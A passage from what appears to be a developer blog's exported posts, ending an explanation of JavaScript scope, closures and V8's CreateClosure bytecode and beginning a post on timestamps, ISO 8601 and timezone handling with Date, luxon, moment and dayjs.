determined during program execution, and you cannot determine the value of “a” just by looking at the structure of the code. JavaScript uses static scope, so you can determine the scope by analyzing the structure of the code. By the way, one of the most difficult problems in JavaScript is “this”. The principle behind it is similar to dynamic scope. The value of “this” is also dynamically determined during program execution, which is why many people cannot figure out what its value is. The more academic term for static scope is lexical scope. To understand what “lexical” means, you must first understand a bit about how compilers work. During compilation, there are several steps where the program parses and analyzes your code, and one of these steps is called Lexical Analysis. It is to correctly analyze every word in the code. For example, the sentence “a &#x3D; 13 + 2” may be grouped into “a”, “&#x3D;”, “13”, “+”, and “2” after lexical analysis. This is just a basic understanding. If you want to know more about the details of compilers, please refer to relevant books or articles, or wait until I have completed this foundation and share it with you in plain language. The reason it is called lexical scope is that during compilation, the scope can be determined, hence the name. That’s all for the content related to scope. Let’s review a few keywords: Scope chain Free variable Static scope (lexical scope) Dynamic scope ClosureNow let’s finally get into the content related to closures. Before that, let me introduce what closures are and what characteristics they have. Please see the following sample code: function test() &#123; var a = 10 function inner() &#123; console.log(a) // 10 &#125; inner() &#125; test() There is nothing special, just executing an internal function. But what if we don’t execute “inner” directly, but return this function? function test() &#123; var a = 10 function inner() &#123; console.log(a) // 還是 10 &#125; return inner &#125; var inner = test() inner() Something magical happened, the code still outputs 10. What’s so magical about it? The magical thing is that after a function is executed, all related resources should be released. However, even though “test” has finished executing, I can still access “a” when calling “inner”! In other words, the variable “a” is “closed” inside the “inner” function, so as long as “inner” exists, “a” will never be at peace and can only be trapped inside. The main reason is that I returned a function inside the function, which caused this phenomenon of something being closed even though it has been executed, and this situation is what people commonly know as a closure. What are the benefits of closures? One of the advantages is that it can hide variables inside so that they cannot be accessed from outside. For example, I have a variable that records the balance and a function that deducts money, but I have set a limit that the maximum deduction is only 10 dollars: var my_balance = 999 function deduct(n) &#123; my_balance -= (n > 10 ? 10 : n) // 超過 10 塊只扣 10 塊 &#125; deduct(13) // 只被扣 10 塊 my_balance -= 999 // 還是被扣了 999 塊 Although we have written the “deduct” function to operate, the variable is still exposed outside, and anyone can directly modify it. At this time, if we use closures to rewrite it, the world will be different: function getWallet() &#123; var my_balance = 999 return &#123; deduct: function(n) &#123; my_balance -= (n > 10 ? 10 : n) // 超過 10 塊只扣 10 塊 &#125; &#125; &#125; var wallet = getWallet() wallet.deduct(13) // 只被扣 10 塊 my_balance -= 999 // Uncaught ReferenceError: my_balance is not defined Because I hid the “balance” variable inside the function, it cannot be accessed from outside. If you want to modify it, you can only use the “deduct” function I exposed, which achieves the purpose of hiding information and ensures that the variable will not be easily modified. But compared to the usage of this closure, I believe many people should have learned about closures from this painful experience: var btn = document.querySelectorAll('button') for(var i=0; i&lt;=4; i++) &#123; btn[i].addEventListener('click', function() &#123; alert(i) &#125;) &#125; Suppose there are five buttons on the page, and I want the first one to pop up 0 when pressed, the second one to pop up 1 when pressed, and so on. So I wrote the code above, which looks very reasonable. Who knows when I click on a button, why the hell does every button pop up 5, and why do they all pop up the same number? Where did 5 come from? Even I myself had a similar experience before realizing that I was not familiar with the scope and closure. Now that I have experience, I can fully understand the above code. First of all, you might think the loop above is like this: btn[0].addEventListener('click', function() &#123; alert(0) &#125;) btn[1].addEventListener('click', function() &#123; alert(1) &#125;) ... But it’s actually like this: btn[0].addEventListener('click', function() &#123; alert(i) &#125;) btn[1].addEventListener('click', function() &#123; alert(i) &#125;) ... If you think about it carefully, you will find that the latter is more reasonable. I just added a function to it, which will pop up i when pressed, and I didn’t execute this function directly. So when the user clicks the button, the screen will pop up i. What is the value of this i? Because the loop has already finished running when you click the button, i has long been 5 (the last round of the loop, i plus one becomes 5, and the condition i&lt;&#x3D;4 is not met, so the loop exits), and the screen pops up the number 5. The several functions I added don’t have the variable i itself, so they look for the variable i in the outer layer of the scope, and then they find the variable i in the loop above, so the i referred to by these functions is the same i. So how to solve this problem? Add a function! function getAlert(num) &#123; return function() &#123; alert(num) &#125; &#125; for(var i=0; i&lt;=4; i++) &#123; btn[i].addEventListener('click', getAlert(i)) &#125; Note that getAlert(i) will “return” a function that pops up i, so I generated five new functions, each with its own value to pop up. Or if you want to be cool, write it like this: for(var i=0; i&lt;=4; i++) &#123; (function(num) &#123; btn[i].addEventListener('click', function() &#123; alert(num) &#125;) &#125;)(i) &#125; Wrap a function in an IIFE (Immediately Invoked Function Expression) and execute it immediately by passing in i, so a new function will be called immediately every time the loop runs, creating a new scope. If you think all of the above is too cumbersome and don’t want to use it, congratulations, after the introduction of block scope in ES6, you just need to simply change the var used in the loop to let: for(let i=0; i&lt;=4; i++) &#123; btn[i].addEventListener('click', function() &#123; alert(i) &#125;) &#125; Because of the characteristics of let, a new scope is actually generated every time the loop runs, so the value popped up by alert will be the value you want. If you still feel a little confused, you can think of the loop like this: &#123; // 塊級作用域 let i=0 btn[i].addEventListener('click', function() &#123; alert(i) &#125;) &#125; &#123; // 塊級作用域 let i=1 btn[i].addEventListener('click', function() &#123; alert(i) &#125;) &#125; ... So far, we have a preliminary understanding of closures, but we seem to have no clear definition of “what is a closure”. “Closure is a function that can enclose values” sounds strange. If you go to Wikipedia, it will tell you: In computer science, a closure is a record storing a function together with an environment. If you go to the English Wikipedia, you can see that it says: Operationally, a closure is a record storing a function together with an environment. Okay, it still seems a bit vague, but let’s stop here for the definition of closures. It’s good to have a vague concept in your mind. Let’s come back to deal with the scope in ECMAScript. Scope in ECMAScriptBefore we start, if you forget the operating model we talked about before, please go back to I know you understand hoisting, but how deep do you understand? to review, because we will use it later. Here I will still use ES3 with less content as an example. Note that many terms have changed after ES6, but the principles are roughly the same. Last time we saw something related to hoisting in the section 10.1.3 Variable Instantiation. This time we will look at the next section, which is 10.1.4 Scope Chain and Identifier Resolution. Every execution context has associated with it a scope chain. A scope chain is a list of objects that are searched when evaluating an Identifier. When control enters an execution context, a scope chain is created and populated with an initial set of objects, depending on the type of code. Each EC has its own scope chain, which is established when entering the EC. Next, let’s look at 10.2.3 Function Code under 10.2 Entering An Execution Context: The scope chain is initialised to contain the activation object followed by the objects in the scope chain stored in the [[Scope]] property of the Function object. This paragraph describes what the scope chain contains. It states that when entering an EC, the scope chain is initialized to the activation object followed by the objects in the scope chain stored in the [[Scope]] property of the Function object. In fact, the above paragraph only wants to say one thing, that is, the following will be done when entering an EC: scope chain = activation object + [[Scope]] The next thing to deal with is two questions: what is the activation object (AO), and what is [[Scope]]? In 10.1.6 Activation Object, you can find an explanation of AO: When control enters an execution context for function code, an object called the activation object is created and associated with the execution context. The activation object is initialised with a property with name arguments and attributes { DontDelete } The activation object is then used as the variable object for the purposes of variable instantiation. Here, it is mentioned that When control enters an execution context for function code, which means that only when entering a “function” will this AO be generated, and then the AO will be used as the VO for variable instantiation. So what is AO? You can directly regard it as another special type of VO, which only appears in the EC of the function. Therefore, we have VO in the global scope, and AO in the function scope, but they do the same thing, which is to put some related information in it. What is the difference? The difference is that AO will have an arguments inside it. After all, it is for the function, so it must be stored, and the rest is almost the same. If you are lazy and use the terms VO and AO interchangeably, I think it is acceptable because the difference is really too subtle. After solving the problem of AO, what is [[Scope]]? In 13.2 Creating Function Objects, you can see a more detailed explanation: Given an optional parameter list specified by FormalParameterList, a body specified by FunctionBody, and a scope chain specified by Scope, a Function object is constructed as follows (omitted in the middle) 7.Set the [[Scope]] property of F to a new scope chain (10.1.4) that contains the same objects as Scope. It means that when you create a function, you will give it a Scope, and this Scope will be set to [[Scope]]. What is the Scope given when creating a function? What else can it be? Of course, it is the Scope of the current EC. After reading these paragraphs, we can actually summarize the following process: When function A is created, set A.[[Scope]] = scope chain of current EC When entering a function A, a new EC is generated, and set EC.scope_chain = AO + A.[[Scope]] To fully understand it, let’s run through this whole process with the following very simple code as an example: var v1 = 10 function test() &#123; var vTest = 20 function inner() &#123; console.log(v1, vTest) //10 20 &#125; return inner &#125; var inner = test() inner() Step 1: Enter Global ECNow enter the Global EC and initialize VO and scope chain. As mentioned earlier, scope chain = activation object + [[Scope]], but since this is not a function, there is no [[Scope]], and without AO, VO is used directly. In short, the final Global EC will look like this: globalEC = &#123; VO: &#123; v1: undefined, inner: undefined, test: function &#125;, scopeChain: globalEC.VO &#125; As for the VO part, it is initialized as previously mentioned. The only additional step now is the addition of the scopeChain property. According to the definition, the scope chain is the globalEC’s own VO&#x2F;AO. Don’t forget the last step, which is to set the [[Scope]] of the function. Therefore, the [[Scope]] of the test function will be globalEC.scopeChain, which is globalEC.VO. Step 2: Execute the CodeNext, execute the code. After running var v1 = 10, it encounters var inner = test(). We are now preparing to enter the test EC. Before entering, our current information looks like this: globalEC = &#123; VO: &#123; v1: 10, inner: undefined, test: function &#125;, scopeChain: globalEC.VO &#125; test.[[Scope]] = globalEC.scopeChain Step 3: Enter the test ECAs usual, when entering, first establish the test EC and AO, and remember that scope chain = activation object + [[Scope]]. testEC = &#123; AO: &#123; arguments, vTest: undefined, inner: function &#125;, scopeChain: [testEC.AO, test.[[Scope]]] = [testEC.AO, globalEC.scopeChain] = [testEC.AO, globalEC.VO] &#125; globalEC = &#123; VO: &#123; v1: 10, inner: undefined, test: function &#125;, scopeChain: globalEC.VO &#125; test.[[Scope]] = globalEC.scopeChain As you can see, the scope chain of the testEC is its own AO plus the previously set [[Scope]]. In essence, the scope chain is just the VO&#x2F;AO combination of the upper-level EC! Finally, don’t forget to set the scope of inner, inner.[[Scope]] = testEC.scopeChain. Step 4: Execute the code in testActually, only var vTest = 20 and return inner are executed, and after execution, it becomes like this: testEC = &#123; AO: &#123; arguments, vTest: 20, inner: function &#125;, scopeChain: [testEC.AO, globalEC.VO] &#125; globalEC = &#123; VO: &#123; v1: 10, inner: function, test: function &#125;, scopeChain: globalEC.VO &#125; inner.[[Scope]] = testEC.scopeChain = [testEC.AO, globalEC.VO] Then return inner, and the test function ends. Resources should be released, but have you noticed that inner.[[Scope]] still remembers testEC.AO? Because someone still needs it, it cannot be released like this, even though the test has ended, testEC.AO still exists in memory. Step 5: Enter the inner ECI won’t go into detail here, just follow the same principles to initialize: innerEC = &#123; AO: &#123; arguments &#125;, scopeChain: [innerEC.AO, inner.[[Scope]]] = [innerEC.AO, testEC.scopeChain] = [innerEC.AO, testEC.AO, globalEC.VO] &#125; testEC = &#123; AO: &#123; arguments, vTest: 20, inner: function &#125;, scopeChain: [testEC.AO, globalEC.VO] &#125; globalEC = &#123; VO: &#123; v1: 10, inner: function, test: function &#125;, scopeChain: globalEC.VO &#125; inner.[[Scope]] = testEC.scopeChain = [testEC.AO, globalEC.VO] Have you noticed that, as I just said, the scope chain is just the VO&#x2F;AO combination? Step 6: Execute innerFind the variables v1 and vTest in the scope chain, and since they are not found in their own AO, look up to the upper level. Find vTest in testEC.AO, but v1 is still not found, so look up one level to globalEC.VO, and finally find v1. Successfully obtain the values of these two variables and print them out. End. The above process is explained in more detail, and you can open a small window next to it to see the code step by step. It is believed that it will be easier to understand. In fact, when we discussed hoisting last time, we already talked about this model, and today we just supplemented the part that was not mentioned last time, that is, the scope chain. After adding it, this model is much more complete, not only can it explain hoisting, but also why variables can still be accessed after the function is executed. Because these variables are left in the scope chain of the innerEC, they cannot and should not be garbage collected, which is why this phenomenon occurs. After understanding that the scope chain is just the VO&#x2F;AO combination, it is easy to understand what we mean by “looking up in the scope chain”, which means to look up one level to see if there is such a variable, because if there is, it must exist in the VO&#x2F;AO. Finally, one thing to note about this model is that whether or not I return the internal function (in the example above, inner), it does not affect the operation of this mechanism. This means that even if my code looks like this: var v1 = 10 function test() &#123; var vTest = 20 function inner() &#123; console.log(v1, vTest) //10 20 &#125; inner() // 不回傳直接執行 &#125; test() The resulting model is exactly the same as the previous code, and inner has the same scope chain and stores the VO&#x2F;AO of the test and global ECs. Have you noticed that we are stepping towards our title step by step? All functions are closures.Let’s take a look at the definition of closures on the wiki: In computer science, a closure (also lexical closure or function closure) is a function that has references to free variables. The references are to values in the lexically enclosing scope that has been closed over, i.e., the scope that was in effect when the closure was created, not when invoked. A closure—unlike a plain function—allows the function to access those captured variables through the closure’s reference to them, even when the function is invoked outside their scope. If you think that a closure must “leave the environment that created it,” then the statement “all functions are closures” is obviously not true. However, if you agree that the definition of a closure is “an entity composed of a function and the related referencing environment,” then it means that in JavaScript, all functions are closures. Why? Because this is the operating mechanism of JavaScript. Every function you declare stores [[Scope]], and this information contains the referenced environment. And this statement is not something I made up. In one of the most classic series of articles explaining ECMAScript, ECMA-262-3 in detail. Chapter 6. Closures., it says: Let’s make a note again, that all functions, independently from their type: anonymous, named, function expression or function declaration, because of the scope chain mechanism, are closures. from the theoretical viewpoint: all functions, since all they save at creation variables of a parent context. Even a simple global function, referencing a global variable refers a free variable and therefore, the general scope chain mechanism is used; So theoretically, all functions in JavaScript are closures. from the practical viewpoint: those functions are interesting which: continue to exist after their parent context is finished, e.g. inner functions returned from a parent function; use free variables. But if you only care about closures from a “practical” point of view, we would say that closures must use free variables and must be able to exist after the context in which they were created has ended. This is the closure we are truly concerned with. So what exactly is a closure? It depends on your perspective. But undoubtedly, from a theoretical point of view, all functions in JavaScript are closures. If you still don’t believe it, let me show you what V8 thinks. Exploring V8Let’s write a simple piece of code and see what it compiles to: var a = 23 function yoyoyo()&#123; &#125; yoyoyo() We put a 23 here to make it easier to locate this piece of code in the byte code. Only functions have names that can be identified, and it’s harder to find things written in the global scope. The result is as follows: [generating bytecode for function: ] Parameter count 6 Frame size 16 0x3e0ed5f6a9da @ 0 : 6e 00 00 02 CreateClosure [0], [0], #2 0x3e0ed5f6a9de @ 4 : 1e fa Star r1 10 E&gt; 0x3e0ed5f6a9e0 @ 6 : 91 StackCheck 70 S&gt; 0x3e0ed5f6a9e1 @ 7 : 03 17 LdaSmi [23] 0x3e0ed5f6a9e3 @ 9 : 1e fb Star r0 95 S&gt; 0x3e0ed5f6a9e5 @ 11 : 4f fa 01 CallUndefinedReceiver0 r1, [1] 0x3e0ed5f6a9e8 @ 14 : 04 LdaUndefined 107 S&gt; 0x3e0ed5f6a9e9 @ 15 : 95 Return [generating bytecode for function: yoyoyo] Parameter count 1 Frame size 0 88 E&gt; 0x3e0ed5f6b022 @ 0 : 91 StackCheck 0x3e0ed5f6b023 @ 1 : 04 LdaUndefined 93 S&gt; 0x3e0ed5f6b024 @ 2 : 95 Return Just look at the keywords. Do you see what’s happening when the function is created? It’s CreateClosure. We’re just creating a simple function and calling it, but V8 is still using the CreateClosure instruction. What if we create a new function inside a function? function yoyoyo()&#123; function inner()&#123;&#125; &#125; yoyoyo() Result: [generating bytecode for function: yoyoyo] Parameter count 1 Frame size 8 0x2c9f0836b0fa @ 0 : 6e 00 00 02 CreateClosure [0], [0], #2 0x2c9f0836b0fe @ 4 : 1e fb Star r0 77 E&gt; 0x2c9f0836b100 @ 6 : 91 StackCheck 0x2c9f0836b101 @ 7 : 04 LdaUndefined 106 S&gt; 0x2c9f0836b102 @ 8 : 95 Return It still calls CreateClosure. Finally, let’s try the one we’re familiar with, which is to return the created function: function yoyoyo()&#123; function inner()&#123;&#125; return inner &#125; yoyoyo() Result: [generating bytecode for function: yoyoyo] Parameter count 1 Frame size 8 0x3f4bde3eb0fa @ 0 : 6e 00 00 02 CreateClosure [0], [0], #2 0x3f4bde3eb0fe @ 4 : 1e fb Star r0 77 E&gt; 0x3f4bde3eb100 @ 6 : 91 StackCheck 116 S&gt; 0x3f4bde3eb101 @ 7 : 95 Return What’s the difference? The only difference is that the former loads undefined with LdaUndefined before returning, while the latter does not, so it returns the created function. But the instruction for creating the function is exactly the same, and it’s called CreateClosure. Looking only at the compiled code may not be fair, it would be even better to see how V8 works internally. I used to try to find it before, but V8 was too big. This time, I happened to come across this article while looking for information: Analyze implementation of closures in V8. Although it is a nine-year-old article, it mentions some keywords that led me to some interesting places. The first one is src&#x2F;interpreter&#x2F;interpreter-generator.cc, which records all the instructions of the byte code. For CreateClosure, it is described as follows: &#x2F;&#x2F; CreateClosure &lt;index&gt; &lt;slot&gt; &lt;tenured&gt; &#x2F;&#x2F; &#x2F;&#x2F; Creates a new closure for SharedFunctionInfo at position |index| in the &#x2F;&#x2F; constant pool and with the PretenureFlag &lt;tenured&gt;. This file is very helpful for later viewing of byte code, so I want to mention it here. The second one is src&#x2F;contexts.h, which contains a lot of information. You can see this comment: &#x2F;&#x2F; JSFunctions are pairs (context, function code), sometimes also called &#x2F;&#x2F; closures. A Context object is used to represent function contexts and &#x2F;&#x2F; dynamically pushed &#39;with&#39; contexts (or &#39;scopes&#39; in ECMA-262 speak). &#x2F;&#x2F; &#x2F;&#x2F; At runtime, the contexts build a stack in parallel to the execution &#x2F;&#x2F; stack, with the top-most context being the current context. All contexts &#x2F;&#x2F; have the following slots: &#x2F;&#x2F; &#x2F;&#x2F; [ scope_info ] This is the scope info describing the current context. It &#x2F;&#x2F; contains the names of statically allocated context slots, &#x2F;&#x2F; and stack-allocated locals. The names are needed for &#x2F;&#x2F; dynamic lookups in the presence of &#39;with&#39; or &#39;eval&#39;, and &#x2F;&#x2F; for the debugger. In addition to closures, which we are most interested in, it also mentions context and scope info, which are similar concepts with different names. But the most important sentence is: JSFunctions are pairs (context, function code), sometimes also called closures. Every JS function records context information, which confirms the mechanism we discussed earlier. The third and last one is where I unexpectedly found the place where V8 handles scope, in src&#x2F;ast&#x2F;scopes.cc. The link leads to LookupRecursive, which describes the process of finding variables. First, it looks for them in the scope, then it looks up, and if it still can’t find them, it declares them globally. It’s been so long since I’ve been familiar with this process, and it’s really interesting to see how V8 implements it. Although I can’t understand C++ very well, fortunately, there are many comments in the article, so I can understand about 50-60% of the code just by reading the comments. ConclusionThere is one small thing to explain first. In this article and the previous one, I deliberately did not mention eval and with because they make the scope much more complicated, so I intentionally left them out. When I looked at the V8 code, I saw a lot of code dealing with these operations. If you are interested in these operations, you can find related articles to read. In the process of thoroughly understanding hoisting last time, we got the concept of the operation of the most important underlying mechanism and also saw V8’s byte code. This time, we supplemented the previous model to make it more complete. As long as we interpret the operation of the program according to that model, we can easily understand hoisting and closures. This time, we also went deeper into V8 and directly saw the code related to scope and context. However, V8 is still a very large project, and I can’t even finish reading a few files, let alone understand it. Therefore, I just wanted to take a fun perspective to see it. The goal of this article is the same as the previous one. For those who are not familiar with this topic, I hope it can help you understand it. For those who are already familiar with it, I hope it can bring some new ideas. After all, I didn’t see anyone directly running to V8 to find related code segments by looking left and right. References: Talking about JS’s scope from static&#x2F;dynamic scope MDN In-depth understanding of JavaScript closures JavaScript Scope (1) Interpretation of JS scope ECMA-262-3 in detail. Chapter 6. Closures. Grokking V8 closures for fun (and profit?) Understanding JavaScript Closures https://javascript.info/closure Analyze implementation of closures in V8","link":"/2018/12/08/en/javascript-closure/"},{"title":"A Brief Discussion on Time and Timezone Handling in JavaScript","text":"IntroductionBlogs need to display publishing time, restaurant websites need to display reservation time, and auction websites need to display various order times. No matter what you do, you will encounter the very common need to display time. This problem seems simple, just display the time, right? But if it involves “time zones”, the problem will become even more complicated. Regarding time zones, there are usually several requirements: The time on the website needs to be displayed in a fixed time zone. I want to see the same time on the website whether I am in the United States or in Taiwan. The time on the website will be different according to the user’s browser settings. I will see different times in the United States and Taiwan. PM did not consider this issue and only considered local users, so there is no need to worry about this for the time being. And this is only the display part. There is another part that communicates with the backend. We can talk about this later, but in any case, correctly handling time and time zones is not a simple matter. I have recently encountered related issues in one or two jobs, so I have a little experience in this area and wrote this article to share with you. Let’s start with timestampWhen it comes to time, I prefer to start with timestamp, or more precisely, Unix timestamp. What is a timestamp? You open the console of devtool and enter: console.log(new Date().getTime()), and the thing that comes out is what we call a timestamp. And this timestamp refers to: “From UTC+0 time zone, January 1, 1970, 0:00:00, how many milliseconds have passed in total”, and the value I got when writing this article is 1608905630674. The ECMAScript spec is written like this: 20.4.1.1 Time Values and Time Range Time measurement in ECMAScript is analogous to time measurement in POSIX, in particular sharing definition in terms of the proleptic Gregorian calendar, an epoch of midnight at the beginning of 01 January, 1970 UTC, and an accounting of every day as comprising exactly 86,400 seconds (each of which is 1000 milliseconds long). The time in Unix systems is represented in this way, and the timestamp obtained by many programming languages is also similar. However, some may only be accurate to “seconds”, and some may be accurate to “milliseconds”. If you find that some places in the code need to be divided by 1000 or multiplied by 1000, it is likely to be doing the conversion between seconds and milliseconds. We mentioned “UTC +0” above, which actually means +0 time zone. For example, Taiwan’s time zone is +8, or if you want to be more standard, it is GMT +8 or UTC +8. The difference between these two can be found in: Is it GMT+8 or UTC+8?. The current standard is basically UTC, so this article will only use UTC from now on. Standard format for storing timeAfter some basic concepts, let’s talk about how to store time. One way to store it is to store the timestamp mentioned above, but the disadvantage is that you cannot directly see what time it is with the naked eye, and you must go through conversion. Another standard for storing time is called ISO 8601, which can be found in many places. For example, OpenAPI defines a format called date-time, and its description is written like this: the date-time notation as defined by RFC 3339, section 5.6, for example, 2017-07-21T17:32:28Z If you go directly to RFC 3339, the abstract at the beginning already states: This document defines a date and time format for use in Internet protocols that is a profile of the ISO 8601 standard for representation of dates and times using the Gregorian calendar. So what kind of format is this? It’s actually a string that represents a time with a time zone, like 2020-12-26T12:38:00Z. For more detailed rules, you can refer to the RFC: The rules defined in the RFC are more complete, but in general, it is the format I mentioned above. If the letter “Z” is at the end, it represents UTC+0. If you want to use another time zone, you can write it like this: 2020-12-26T12:38:00+08:00, which represents 12:38:00 on December 26th in the +8 time zone. In JavaScript, it is based on an extended format of ISO 8601. In the ECMAScript spec, section 20.4.1.15 Date Time String Format mentions: The most interesting part is the year, which, in addition to the well-known four-digit numbers from 0000 to 9999, can also be a six-digit number and can be negative, representing years before AD: After understanding the standard format for representing time, there is an important concept to keep in mind, which is the relativity of time. For example, the timestamp 1593163158 represents “June 26, 2020, 09:19:00 in UTC+0” and also represents “June 26, 2020, 17:19:00 in UTC+8”. These two times are the same. Therefore, when you get a timestamp, you cannot know what time zone to display it in based on the timestamp itself. After discussing these concepts, let’s talk about how to handle time in JavaScript. Handling Time in JavaScriptIn JavaScript, you can use Date to handle time-related requirements. For example, new Date() can generate the current time, and new Date().toISOString() can generate a string in ISO 8601 format, like 2020-12-26T04:52:26.255Z. If you pass a parameter to new Date(), it will help you parse the time. For example, new Date(1593163158000) or new Date(&#39;2020-12-26T04:52:26.255Z&#39;). In addition, there are many functions that can help you get various parts of the time. Using the string 2020-12-26T04:52:26.255Z as an example, we can use new Date(&#39;2020-12-26T04:52:26.255Z&#39;) with the following functions: getYear &#x3D;&gt; 120 getMonth &#x3D;&gt; 11 getDate &#x3D;&gt; 26 getHours &#x3D;&gt; 12 getMinutes &#x3D;&gt; 52 getSeconds &#x3D;&gt; 26 getMilliseconds &#x3D;&gt; 255 Some parts look completely fine, but some parts look strange. Let’s explain the strange parts. getYearYou might expect to get 2020, but you get 120 because getYear returns the year minus 1900. If you want to get 2020, use getFullYear. getMonthYou might expect to get 12, but you get 11 because the number obtained here starts from 0. So if it is January, you get 0, so you get 11 for December. getHoursThe time passed in is 4, so you expect to get 4, but you get 12. This is because before performing these operations, JS converts the time to “Local Time”: Therefore, 4 o’clock in UTC+0 becomes 12 o’clock in UTC+8 after conversion, so you get 12. Ignoring the feature of converting to local time, many people may wonder why the month needs to be subtracted by 1, and why getYear doesn’t return the year properly. These designs are not unique to JS, but were copied directly from Java 1.0. Although JavaScript and Java are not really related now, their origins were very deep when JavaScript was first born (otherwise, why would it be named that way). It was originally hoped that the syntax would look like Java to attract Java developers, so it was reasonable to copy the entire java.util.Date from Java 1.0. However, these designs were deprecated after JDK 1.1, but JavaScript still uses them for backward compatibility. You can still find explanations for getMonth and getYear in Java’s documentation. And getYear returning results after -1900 was considered normal at the time because it was common to store only two digits for the year, such as 87 for 1987. This also led to the Year 2000 Problem (Y2K) where the year would become 00 in 2000. These historical events are mentioned in “JavaScript: the first 20 years”, with the Java date section on page 19. Things to note about date and timeUsing new Date(string) is equivalent to Date.parse(string), which allows JS to parse a string and convert it to a time. If the string you provide conforms to the standard format, there is no problem. However, if it does not conform to the standard, different results may occur depending on the implementation: This is where you need to be careful. For example, these two strings: new Date(&#39;2020-02-10&#39;) new Date(&#39;2020&#x2F;02&#x2F;10&#39;) Aren’t they both February 10, 2020? But if you run them on Chrome devtools, you’ll notice a slight difference: According to the spec: When the UTC offset representation is absent, date-only forms are interpreted as a UTC time and date-time forms are interpreted as a local time. The former conforms to the ISO 8601 format, so it is parsed as February 10 at 0:00 UTC+0, which is why the result we see is 8:00 in the +8 time zone. The latter does not conform to the ISO 8601 format, so different results may occur depending on the implementation. It appears that V8 treats the second format as local time. V8’s date parser is located here: src&#x2F;date&#x2F;dateparser-inl.h (although I haven’t found the exact line that causes this result yet). Another common non-standard format is: 2020-02-02 13:00:00 This format is missing a T and will return an Invalid Date in Safari, but can be parsed correctly in Chrome. I think this is reasonable because you’re providing a non-standard format, which is invalid. The browser parsing it correctly is just an extra step, but you can’t blame it if it can’t parse it. Note: Thanks to othree for the comment and discussion. There is actually a small detail here regarding ISO 8601 and RFC3339. ISO 8601 states: The character [T] shall be used as time designator to indicate the start of the representation of the time of day component in these expressions. NOTE By mutual agreement of the partners in information interchange, the character [T] may be omitted in applications where there is no risk of confusing a date and time of day representation with others defined in this International Standard. This means that in the ISO 8601 standard, the T character can be omitted if both parties agree, resulting in something like: 2020-02-0213:00:00, but it does not say that it can be replaced with a space. In RFC3339, it is written: NOTE: ISO 8601 defines date and time separated by “T”. Applications using this syntax may choose, for the sake of readability, to specify a full-date and full-time separated by (say) a space character. So, RFC3339 allows using a space instead of T for readability. Therefore, a string separated by a space follows RFC3339 but not ISO 8601. So, what about ECMAScript? According to the spec, it seems that T is also required. Therefore, in ECMAScript, a correct date time needs to use T to separate it and cannot be replaced by a space. However, the interesting thing is that before ES5, the ECMAScript specification did not specify the format of date time. That is to say, there was no standard format, so omitting a T could still be parsed and treated as a behavior reserved for supporting previous implementations. (Reference: In an ISO 8601 date, is the T character mandatory?, Allow space to separate date and time as per RFC3339) Anyway, adding T will solve the problem, and after adding it, it will become a date time without a time zone: 2020-02-02T13:00:00. When thrown into Chrome, it is: Sun Feb 02 2020 13:00:00 GMT+0800. When thrown into Safari, it is: Sun Feb 02 2020 21:00:00 GMT+0800. According to the excerpt from the spec we posted above, if the time zone is missing and it is in date time format, it should be treated as local time. Therefore, Chrome’s approach is correct, but Safari treats this time as UTC +0 time, so it is eight hours behind. I think this is a bug, but I didn’t find anyone reporting it in the WebKit bug tracker. Maybe there is a special reason for doing this. These issues can also be referred to in Front-end Engineering Research: Common Pitfalls and Recommended Practices for the Date Type in JavaScript, which mentions more tests on browsers. But the key principle is to use the standard format to communicate, and then there will be no such problems. Finally, let’s talk about displaying time zonesAfter talking so much, we can finally talk about the problem of time zones mentioned at the beginning. When dealing with time, most people should choose a library that looks good to use, such as moment, date-fns, dayjs, or luxon. If these libraries are not used correctly, the results will be different from what you imagine. For example, what will be the output of the following code? luxon.DateTime .fromISO('2020-02-02T13:00:00+03:00') .toFormat('HH:mm:ss') ………Prevent Lightning………… Many people mistakenly think that if your date time has a timezone, the formatted result will follow that timezone. But that’s not the case. The final format will still be based on local time. Therefore, in the example above, since my computer is in the +8 time zone in Taiwan, the result will be 18:00:00 instead of 13:00:00. You must remember this. Both dayjs and moment are the same. If the time zone is not specified before formatting, the formatted result will follow the user’s current time zone. Therefore, the same code may have different outputs on different users’ computers. Therefore, what the server gives you is not important. Whether it is 2020-02-02T13:00:00+03:00, 2020-02-02T10:00:00Z, or 2020-02-02T18:00:00+08:00, it is the same for the front-end and represents the same time. Formatting will also produce the same result. If you want to use the time zone in the date time as the main display, you can use it like this: luxon.DateTime .fromISO('2020-02-02T13:00:00+03:00', &#123; setZone: true &#125;) .toFormat('HH:mm:ss') But in most cases, it is recommended that the front-end decides which time zone to display, rather than relying on the date time given by the back-end. So, how to decide which time zone to display? For luxon, it would be like this: luxon.DateTime .fromISO('2020-02-02T13:00:00+03:00') .setZone('Asia/Tokyo') .toFormat('HH:mm:ss') For moment, it would be like this: moment('2020-02-02T13:00:00+03:00') .tz('Asia/Tokyo') .format('HH:mm:ss') dayjs is similar: dayjs('2020-02-02T13:00:00+03:00') .tz('Asia/Tokyo') .format('HH:mm:ss') By doing this, we can ensure that the output time is always fixed to the same time zone. When would we need to do this? For example, the company I used to work for was a restaurant reservation website. The backend would send us the time slots available for booking, such as 1pm or 2pm in the afternoon. The backend would use a standard format to send us this information, such as: 2020-02-02T13:00:00+08:00, which represents the time slot available for booking at 1pm on February 2, 2020. When displaying this information on the frontend, if we only use moment(&#39;2020-02-02T13:00:00+08:00&#39;).format(&#39;HH:mm&#39;), it will appear correct on my computer and show 13:00. However, this is often the beginning of a bug because we assume it is correct just because it appears correct to us. If we change to a different time zone, such as Japan, the result generated by the same code will be 12:00, which is an unexpected result. Since we are booking a restaurant in Taiwan, the booking time should be displayed in Taiwan time, not the user’s computer time zone. At this point, we need to follow the rules mentioned above and use: moment('2020-02-02T13:00:00+03:00') .tz('Asia/Taipei') .format('HH:mm:ss') to ensure that users in Japan or other places see the results displayed in Taiwan time. Sending Time to the BackendThe previous section discussed how to correctly display a time given by the backend. The solution is to use the correct method to ensure that the time is displayed in a fixed time zone. Another issue to be aware of is the opposite scenario, where the frontend needs to generate a date time and send it to the backend. For example, continuing with the restaurant reservation website example, suppose there is a contact customer service page where the user needs to fill in the date to visit the restaurant, in the format: 2020-12-26. However, the data sent to the backend will be in date time format, so we need to convert it to the ISO 8601 standard format. How would we do this? Some people might think it’s simple. The native method is new Date(&#39;2020-12-26&#39;).toISOString(), or with other libraries it might be moment(&#39;2020-12-26&#39;).format(). However, this is incorrect. Suppose the restaurant we are visiting is in Taiwan. Then, the date 2020-12-26 should be in Taiwan time, and the correct output should be 2020-12-26T00:00:00+08:00 or 2020-12-25T16:00:00Z, which is simply 0:00 on December 26 in Taiwan time. The above code may generate “0:00 in UTC+0 time zone” or “0:00 in 